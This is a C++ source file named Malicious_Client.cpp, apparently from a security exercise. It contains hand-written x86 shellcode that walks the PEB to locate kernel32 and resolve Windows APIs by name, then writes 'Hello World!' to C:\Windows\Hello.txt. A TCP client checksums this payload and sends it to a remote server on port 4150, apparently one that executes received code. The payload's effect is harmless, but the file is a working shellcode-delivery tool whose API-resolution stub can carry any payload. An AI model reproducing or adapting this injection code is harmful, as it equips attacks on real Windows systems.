// Malicious_Client.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "4150"
#define string std::string

typedef struct _SEND_PACKAGE {
     DWORD  DataSize;
     unsigned __int32 Crc;
     char Data[1];
} SEND_PACKAGE, *PSEND_PACKAGE, *LPSEND_PACKAGE;


//CRC32 license notice
/*-
*  COPYRIGHT (C) 1986 Gary S. Brown.  You may use this program, or
*  code or tables extracted from it, as desired without restriction.
*	[Snip]
*
* CRC32 code derived from work by Gary S. Brown.
*/

static unsigned __int32	 crc32_tab[] = {
     0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
     0xe963a535, 0x9e6495a3,	0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
     0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
     0xf3b97148, 0x84be41de,	0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
     0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,	0x14015c4f, 0x63066cd9,
     0xfa0f3d63, 0x8d080df5,	0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
     0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,	0x35b5a8fa, 0x42b2986c,
     0xdbbbc9d6, 0xacbcf940,	0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
     0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
     0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
     0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,	0x76dc4190, 0x01db7106,
     0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
     0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
     0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
     0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
     0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
     0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
     0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
     0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
     0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
     0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
     0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
     0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
     0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
     0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
     0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
     0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
     0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
     0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
     0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
     0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
     0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
     0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
     0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
     0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
     0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
     0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
     0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
     0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
     0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
     0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
     0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
     0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

unsigned __int32 crc32(unsigned __int32	 crc, const void *buf, size_t size)
{
     const unsigned __int8  *p;

     p = (const unsigned __int8 *)buf;
     crc = crc ^ ~0U;

     while (size--)
          crc = crc32_tab[(crc ^ *p++) & 0xFF] ^ (crc >> 8);

     return crc ^ ~0U;
}


char* getPayload(DWORD* payloadSize)
{
     __asm
     {
          
          mov ecx, END_PAYLOAD
          sub ecx, START_PAYLOAD
          mov eax, dword ptr[payloadSize]
          mov dword ptr[eax], ecx
          call END_PAYLOAD
          START_PAYLOAD :

          ; backup registers and previous stack frame
               push ebp
               mov ebp, esp
               push ebx
               push esi
               push edi
          ; find kernel32.dll base addres

               xor ecx, ecx                            ; ECX = 0
               mov eax, fs:[ecx + 0x30]                ; EAX = PEB
               mov eax, [eax + 0xc]                    ; EAX = PEB->Ldr
               mov esi, [eax + 0x14]                   ; ESI = PEB->Ldr.InMemOrder
               lodsd                                   ; EAX = Second module
               xchg eax, esi                           ; EAX = ESI, ESI = EAX
               lodsd                                   ; EAX = Third(kernel32)
               mov ebx, [eax + 0x10]                   ; EBX = Base address

               ; find kernel32.dlls exprot table
               mov edx, [ebx + 0x3c]                   ; EDX = DOS->e_lfanew
               add edx, ebx                            ; EDX = PE Header
               mov edx, [edx + 0x78]                   ; EDX = Offset export table
               add edx, ebx                            ; EDX = Export table
               mov esi, [edx + 0x20]                   ; ESI = Offset names table
               add esi, ebx                            ; ESI = Names table

               ; find GetProcAddress function name
               xor ecx, ecx                            ; EXC = 0
               Get_Function:
               inc ecx                                 ; Increment the ordinal
               lodsd                                   ; Get name offset
               add eax, ebx                            ; Get function name
               cmp dword ptr[eax], 0x50746547          ; GetP
               jnz Get_Function
               cmp dword ptr[eax + 0x4], 0x41636f72    ; rocA
               jnz Get_Function
               cmp dword ptr[eax + 0x8], 0x65726464    ; ddre
               jnz Get_Function

               ; find GetProcAddress function address
               mov esi, [edx + 0x24]                   ; ESI = Offset ordinals
               add esi, ebx                            ; ESI = Ordinals table
               mov cx, [esi + ecx * 2]                 ; CX = Number of function
               dec ecx
               mov esi, [edx + 0x1c]                   ; ESI = Offset address table
               add esi, ebx                            ; ESI = Address table
               mov edx, [esi + ecx * 4]                ; EDX = Pointer(offset)
               add edx, ebx                            ; EDX = GetProcAddress

               ; find CreateFileA function address
               xor ecx, ecx                            ; ECX = 0
               push ebx                                ; Kernel32 base address
               push edx                                ; GetProcAddress
               push ecx                                ; 0
               push  0x6141656c                        ; leAa
               sub dword ptr[esp + 0x3], 0x61          ; Remove "a"
               push 0x69466574                         ; teFi
               push 0x61657243                         ; Crea
               push esp                                ; "CreateFileA"
               push ebx                                ; Kernel32 base address
               call edx                                ; GetProcAddress(CreateFileA)
               add esp, 0xc                            ; pop "CreateFileA"
               pop ecx                                 ; ECX = 0

               ; call CreateFile function
               push ecx                                ; 0
               push 0x7478742e                         ; .txt
               push 0x6f6c6c65                         ; ello
               push 0x485c7377                         ; ws\H
               push 0x6f646e69                         ; indo
               push 0x575c3a43                         ; C:\W
               mov esi, esp                            ; ESI = "C:\Windows\Hello.txt"
               push ecx                                ; 0
               push 0x0fffffff                         ; 0x80 = FILE_ATTRIBUTE_NORMAL
               sub dword ptr[esp], 0x0fffff7f
               push 0x2                                ; CREATE_ALWAYS
               push ecx                                ; 0
               push ecx                                ; 0
               mov ecx, 0xfffffff
               inc ecx                                 ; ECX = 0x10000000 = GENERIC_ALL
               push ecx                                ; GENERIC_ALL
               push esi                                ; "C:\Windows\Hello.txt"
               call eax                                ; CreateFile("C:\Windows\Hello.txt", GENERIC_ALL, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
               add esp, 0x14                           ; pop "C:\Windows\Hello.txt"
               pop ecx                                 ; ECX = 0
               cmp eax, 0
               jl EXIT_PROCESS
               push eax                                ; handle to file.txt

               ; find WriteFile function address
               mov ebx, [esp + 0x8]                    ; EBX = Kernel32 base address
               mov edx, [esp + 0x4]                    ; EDX = GetProcAddress
               push ecx                                ; 0
               mov cl, 0x65                            ; e
               push cl
               push 0x6c694665                         ; eFil
               push 0x74697257                         ; Writ
               push esp                                ; "WriteFile"
               push ebx                                ; Kernel32 base address
               call edx                                ; GetProcAddress(WriteFile)
               add esp, 0xc                            ; pop "WriteFile"
               pop ecx                                 ; ECX = 0

               ; call WriteFile function
               mov edx, [esp]                          ; EDX = handle to file.txt
               push ecx                                ; 0
               push 0x21646c72                         ; rld!
               push 0x6f57206f                         ; o Wo
               push 0x6c6c6548                         ; Hell
               mov esi, esp                            ; ESI = "Hello World!"
               push ecx                                ; reserve DWORD lpNumberOfBytesWritten = 0
               mov edi, esp                            ; EDI = &lpNumberOfBytesWritten
               push ecx                                ; 0
               push edi                                ; &lpNumberOfBytesWritten
               push 0xc                                ; nNumberOfBytesToWrite = 12
               push esi                                ; "Hello World!"
               push edx                                ; handle to file.txt
               call eax                                ; WriteFile(hfile, "Hello World!", 12, &lpNumberOfBytesWritten, 0)
               add esp, 0x10                           ; pop "Hello World!" and lpNumberOfBytesWritten
               pop ecx                                 ; ECX = 0

               ; find CloseHandle function address
               mov ebx, [esp + 0x8]                    ; EBX = Kernel32 base address
               mov edx, [esp + 0x4]                    ; EDX = GetProcAddress
               push ecx                                ; 0
               push 0x61656c64                         ; dlea
               sub dword ptr[esp + 0x3], 0x61          ; Remove "a"
               push 0x6e614865                         ; eHan
               push 0x736f6c43                         ; Clos
               push esp                                ; "CloseHandle"
               push ebx                                ; Kernel32 base address
               call edx                                ; GetProcAddress(CloseHandle)
               add esp, 0xc                            ; pop "CloseHandle"
               pop ecx                                 ; ECX = 0
               
               ; call CloseHandle function
               mov edx, [esp]                          ; EDX = handle to file.txt
               push edx                                ; handle to file.txt
               call eax                                ; CloseHanlde(handle to file.txt)
               add esp, 0x4                            ; pop handle to file

               EXIT_PROCESS:
               add esp, 0x8                            ; cleanup stack
               ; restore registers and previous stack frame and return
               xor al, al
               inc al                                  ; return TRUE
               pop edi
               pop esi
               pop ebx
               mov esp, ebp
               pop ebp
               ret
               ; a bit of nop padding wont do any harm
               nop
               nop
               nop
               nop
               END_PAYLOAD :
               pop eax 
     }
}

int __cdecl main(int argc, char **argv)
{
    
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo *result = NULL,
          *ptr = NULL,
          hints;
   
     char *sendbuf = NULL;
     char recvbuf[DEFAULT_BUFLEN];
     int iResult;
     int recvbuflen = DEFAULT_BUFLEN;

     DWORD shellCodeSize = 0;
     
     char* shellCode = getPayload(&shellCodeSize);
     shellCode;

     unsigned __int32 shellCodeCrc =  crc32(0, shellCode, shellCodeSize);
     
     size_t packageSize = sizeof(shellCodeSize) + sizeof(shellCodeCrc) + shellCodeSize;
     PSEND_PACKAGE package = (PSEND_PACKAGE)LocalAlloc(LPTR, packageSize);
     package->DataSize = shellCodeSize;
     package->Crc = shellCodeCrc;
     //strcpy_s((char*)(package->Data), shellCodeSize, shellCode);
     memcpy((char*)(package->Data), shellCode, shellCodeSize);

     sendbuf = (char*)package;

     // Validate the parameters
     if (argc != 2) {
          printf("usage: %s server-name\n", argv[0]);
          Sleep(10000);
          return 1;
     }

     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0) {
          printf("WSAStartup failed with error: %d\n", iResult);
          LocalFree(package);
          Sleep(10000);
          return 1;
     }

     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;

     // Resolve the server address and port
     iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
     if (iResult != 0) {
          printf("getaddrinfo failed with error: %d\n", iResult);
          WSACleanup();
          LocalFree(package);
          Sleep(10000);
          return 1;
     }

     // Attempt to connect to an address until one succeeds
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

          // Create a SOCKET for connecting to server
          ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
               ptr->ai_protocol);
          if (ConnectSocket == INVALID_SOCKET) {
               printf("socket failed with error: %ld\n", WSAGetLastError());
               WSACleanup();
               LocalFree(package);
               Sleep(10000);
               return 1;
          }

          // Connect to server.
          iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
          if (iResult == SOCKET_ERROR) {
               closesocket(ConnectSocket);
               ConnectSocket = INVALID_SOCKET;
               continue;
          }
         
          break;
     }

     freeaddrinfo(result);
     printf("Connecting to server: %s\n", argv[1]);
     if (ConnectSocket == INVALID_SOCKET) {
          printf("Unable to connect to server!\n");
          WSACleanup();
          LocalFree(package);
          Sleep(10000);
          return 1;
     }

     // Send an initial buffer

     printf("Connection succeeded!\nSending payload to server.\n");
     iResult = send(ConnectSocket, sendbuf, packageSize, 0);
     if (iResult == SOCKET_ERROR) {
          printf("send failed with error: %d\n", WSAGetLastError());
          closesocket(ConnectSocket);
          WSACleanup();
          LocalFree(package);
          Sleep(10000);
          return 1;
     }

     printf("Bytes Sent: %ld\n", iResult);
     LocalFree(package);

     // shutdown the connection since no more data will be sent
     printf("Closing connection.\n");
     iResult = shutdown(ConnectSocket, SD_SEND);
     if (iResult == SOCKET_ERROR) {
          printf("shutdown failed with error: %d\n", WSAGetLastError());
          closesocket(ConnectSocket);
          WSACleanup();
          Sleep(10000);
          return 1;
     }

     // Receive until the peer closes the connection
     do {

          iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
          if (iResult > 0)
               printf("Bytes received: %d\n", iResult);
          else if (iResult == 0)
               printf("Connection closed\n");
          else
               printf("recv failed with error: %d\n", WSAGetLastError());

     } while (iResult > 0);

     // cleanup
     closesocket(ConnectSocket);
     WSACleanup();

     Sleep(10000);
     return 0;
}